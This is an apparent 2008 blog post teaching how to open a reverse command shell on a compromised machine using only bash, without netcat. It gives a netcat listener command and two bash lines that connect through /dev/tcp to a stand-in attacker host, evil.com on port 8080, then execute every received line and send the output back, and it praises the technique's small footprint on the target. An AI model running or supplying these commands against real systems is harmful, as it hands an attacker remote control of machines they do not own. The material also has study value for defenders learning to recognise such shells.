---
title: Reverse Shell with Bash
author: petko-d-petkov
date: Sat, 19 Apr 2008 11:03:39 GMT
template: this/views/post.jade
---

I am stuck at the Dubai International Airport and I have nothing else interesting to do. So, I though I might share a simple technique which will go into the [Agile Hacking](/blog/agile-hacking/) project. Here I will show you how to create a reverse command shell without using any 3rd-party tools such as the all mighty netcat.

When we compromise a machine we often need to provide ourselves with a user friendly access to the system. This is where command shells come into place. The typical shell consists of a generic network client, typically netcat, listening on a remote port which pipes output into something like bash or any other command shell. Another type of shell is the reverse shell which consists of a generic network client, again something like netcat, connecting to the attacker's machine and piping input to bash. Most of the time, the attacker will use netcat, because this tool can be easily found on most system or easily compiled from source if required.

Although netcat is very useful, and you may have to use it in most cases, here is a simple technique which emulates what netcat does but it relies on bash only. Let's see how.

In step one we start a listening service on our box. We can use netcat, or whatever you might have at hand.

	$ nc -l -p 8080 -vvv

On the target we have to perform some bash-fu. We will create a new descriptor which is assigned to a network node. Then we will read and write to that descriptor.

	$ exec 5<>/dev/tcp/evil.com/8080
	$ cat <&5 | while read line; do $line 2>&5 >&5; done

There you go. Now everything we type in our local listening server will get executed on the target and the output of the commands will be piped back. Keep in mind that we don't use any 3rd-party tools on the target but its default shell. This technique comes handy in many situations and it leaves very small footprint on the targeted system.
